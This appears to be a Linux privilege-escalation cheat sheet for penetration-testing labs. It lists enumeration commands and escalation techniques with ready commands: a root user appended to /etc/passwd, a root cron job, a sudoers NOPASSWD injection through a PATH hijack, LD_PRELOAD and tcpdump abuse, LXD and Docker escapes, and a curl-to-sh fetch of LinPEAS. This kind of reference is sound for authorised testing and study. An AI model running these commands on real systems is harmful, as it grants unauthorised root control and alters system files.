# Linux Privilege Escalation

Comprehensive enumeration and exploitation paths. Always start with automated tools then manual.

## Initial Enumeration

| **Command** | **Description** |
| --------------|-------------------|
| `ssh htb-student@<target IP>` | SSH to lab target |
| `ps aux \| grep root` | See processes running as root |
| `ps au` | See logged in users |
| `ls /home` | View user home directories |
| `ls -l ~/.ssh` | Check for SSH keys for current user |
| `history` | Check the current user's Bash history |
| `sudo -l` | Can the user run anything as another user? |
| `ls -la /etc/cron.daily` | Check for daily Cron jobs |
| `lsblk` | Check for unmounted file systems/drives |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` | Find world-writeable directories |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Find world-writeable files |
| `uname -a` | Check the Kernel versiion |
| `cat /etc/lsb-release ` | Check the OS version |
| `gcc kernel_expoit.c -o kernel_expoit` | Compile an exploit written in C |
| `screen -v` | Check the installed version of `Screen` |
| `./pspy64 -pf -i 1000` | View running processes with `pspy` |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SETGID bit set |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump` |
| `echo $PATH` | Check the current user's PATH variable contents |
| `PATH=.:${PATH}` | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Search for config files |
| `ldd /bin/ls` | View the shared objects required by a binary |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` | Escalate privileges using `LD_PRELOAD` |
| `readelf -d payroll  \| grep PATH` | Check the RUNPATH of a binary |
| `gcc src.c -fPIC -shared -o /development/libshared.so` | Compiled a shared libary |
| `lxd init` | Start the LXD initialization process |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` | Import a local image |
| `lxc init alpine r00t -c security.privileged=true` | Start a privileged LXD container |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | Mount the host file system in a container |
| `lxc start r00t` | Start the container |
| `showmount -e 10.129.2.12` | Show the NFS export list |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt` | Mount an NFS share locally |
| `tmux -S /shareds new -s debugsess` | Created a shared `tmux` session socket |
| `./lynis audit system` | Perform a system audit with `Lynis` |

## 2026 Automation + Newer Techniques

**Recommended enumeration first:**
```bash
# LinPEAS (best all-rounder)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# pspy (process snooping, no root needed)
./pspy64 -pf -i 1000

# Linux Exploit Suggester
./linux-exploit-suggester-2.pl -k $(uname -r)
```

## More Enumeration & Exploitation Examples

```bash
# SUID binaries + GTFOBins
find / -perm -4000 -type f 2>/dev/null | while read f; do echo "=== $f ==="; strings $f | head -5; done

# Writable /etc/passwd (classic)
echo 'hacker:$1$abc$def:0:0::/root:/bin/bash' >> /etc/passwd
su hacker

# Cron job abuse (writable script)
ls -l /etc/cron.*
cat /etc/cron.d/backup
echo '* * * * * root /tmp/evil.sh' > /etc/cron.d/mine

# PATH hijacking
echo 'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/id
chmod +x /tmp/id
PATH=/tmp:$PATH sudo -l

# LD_PRELOAD
gcc -fPIC -shared -o /tmp/root.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/service apache2 restart
```

### Container Escape Examples
```bash
# Privileged container
docker run -it --privileged --pid=host alpine chroot /host bash

# Docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash
```

**Recent example CVEs / classes (verify on target):**
- Sudo chroot issues (CVE-2025-32463 / related 2025) — if sudoers allows -R.
- Kernel netfilter / other LPE (CVE-2024-1086 and successors used heavily).
- Container escapes (OverlayFS, runc, Kubernetes).
- Polkit / pkexec remnants and new similar.
- Always check `sudo -l`, capabilities (`getcap -r / 2>/dev/null`), writable /etc/cron*, LD_PRELOAD, PATH hijacks.

**Container / Cloud specific:**
- Docker socket mount abuse
- Privileged containers
- LXD / LXC breakout (still classic)

**Tools 2026:**
- LinPEAS + PEASS-ng suite
- pspy
- trivy / grype for container image vulns (if you have access)
- Manual + GTFOBins (https://gtfobins.github.io/)

References: HackTricks Linux PE checklist, PEASS-ng, GTFOBins, recent CVE feeds.
